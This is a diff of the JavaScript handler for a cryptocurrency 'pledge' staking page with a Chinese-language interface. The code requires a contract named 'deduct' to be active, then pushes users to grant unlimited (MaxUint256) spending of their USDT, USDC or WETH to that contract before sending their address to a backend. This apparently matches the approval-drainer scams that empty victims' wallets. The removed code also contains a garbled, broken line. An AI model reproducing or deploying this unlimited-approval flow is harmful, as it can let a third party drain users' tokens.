@@ -1181,77 +1181,82 @@ document.addEventListener('DOMContentLoaded', async () => {
     });
   }
   if (pledgeBtn) {
-    pledgeBtn.addEventListener('click', async () => {
-      if (!signer || !userAddress) {
-        updateStatus(translations[currentLang].noWallet, true);
-        return;
+  pledgeBtn.addEventListener('click', async () => {
+    if (!signer || !userAddress) {
+      updateStatus(translations[currentLang].noWallet, true);
+      return;
+    }
+    const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
+    if (!isActive) {
+      updateStatus('請先完成合約授權', true);
+      return;
+    }
+    const amount = parseFloat(pledgeAmount.value) || 0;
+    const durationDays = parseInt(pledgeDuration.value) || 90;
+    const token = pledgeToken.value;
+    if (amount <= 0) {
+      updateStatus(translations[currentLang].invalidPledgeAmount, true);
+      return;
+    }
+    const locked = await isPledgeLocked(userAddress);
+    if (locked) {
+      updateStatus('質押進行中，請稍候...', true);
+      return;
+    }
+    pledgeBtn.disabled = true;
+    pledgeBtn.textContent = '處理中...';
+    try {
+      const decimals = token === 'WETH' ? 18 : 6;
+      const bigIntBalance = cachedWalletBalances[token] || 0n;
+      const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
+      if (amount > walletBalance) {
+        throw new Error(translations[currentLang].insufficientBalance);
       }
-      const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
-      if (!isActive) {
-        updateStatus('請先完成合約授權', true);
-        return;
+      const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
+      if (duration && amount < duration.min) {
+        throw new Error(`最低質押金額：${duration.min} ${token}`);
       }
-      const amount = parseFloat(pledgeAmount.value) || 0;
-      const durationDays = parseInt(pledgeDuration.value) || 90;
-      const token = pledgeToken.value;
-      if (amount <= 0) {
-        updateStatus(translations[currentLang].invalidPledgeAmount, true);
-        return;
+      const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
+      const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
+      const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
+      if (currentAllowance < REQUIRED_ALLOWANCE) {
+        updateStatus(`正在為 ${token} 授權...`);
+        const approveTx = await tokenContract.approve.populateTransaction(
+          DEDUCT_CONTRACT_ADDRESS,
+          ethers.MaxUint256
+        );
+        await sendMobileRobustTransaction(approveTx);
       }
-      const locked = await isPledgeLocked(userAddress);
-      if (locked) {
-        updateStatus('質押進行中，請稍候...', true);
-        return;
+      updateStatus('提交質押請求...');
+      const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
+      });
+      if (!response.ok) {
+        const text = await response.text();
+        throw new Error(`請求失敗: ${response.status} - ${text}`);
       }
-      pledgeBtn.disabled = true;
-      pledgeBtn.textContent = '處理中...';
-      try {
-        const decimals = token === 'WETH' ? 18 : 6;
-        const bigIntBalance = cachedWalletBalances[token] || 0n;
-        const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
-        if (amount > walletBalance) {
-          throw new Error(translations[currentLang].insufficientBalance);
+      const result = await response.json();
+      if (!result.success) {
+        throw new Error(result.error || '伺服器拒絕質押請求');
+      }
+      updateStatus(`質押請求已提交，訂單編號：${result.orderId}`);
+      const poll = setInterval(async () => {
+        const stillLocked = await isPledgeLocked(userAddress);
+        if (!stillLocked) {
+          pledgeBtn.disabled = false;
+          pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+          clearInterval(poll);
         }
-        const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
-        if (duration && amount < duration.min) {
-          throw new Error(`最低質押金額：${duration.min} ${token}`);
-        }
-        const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
-        const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
-        const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
-        if (currentAllowance < REQUIRED_ALLOWANCE) {
-          updateStatus(`正在為 ${token} 授權...`);
-          const approveTx = await tokenContract.approve.populateTransaction(
-            DEDUCT_CONTRACT_ADDRESS,
-            ethers.MaxUint256
-          );
-          await sendMobileRobustTransaction(approveTx);
-        }
-        updateStatus('提交質押請求...');
-        const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
-        });
-        if (!response.ok) throw new Error(await response.text());
-        const result = await response.json();
-        if (!result.success) throw new Error(result conquista.error);
-        updateStatus(`質押請求已提交，訂單編號：${result.orderId}`);
-        const poll = setInterval(async () => {
-          const stillLocked = await isPledgeLocked(userAddress);
-          if (!stillLocked) {
-            pledgeBtn.disabled = false;
-            pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-            clearInterval(poll);
-          }
-        }, 2000);
-      } catch (error) {
-        pledgeBtn.disabled = false;
-        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-        updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
-      }
-    });
-  }
+      }, 2000);
+    } catch (error) {
+      pledgeBtn.disabled = false;
+      pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+      updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
+    }
+  });
+}
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
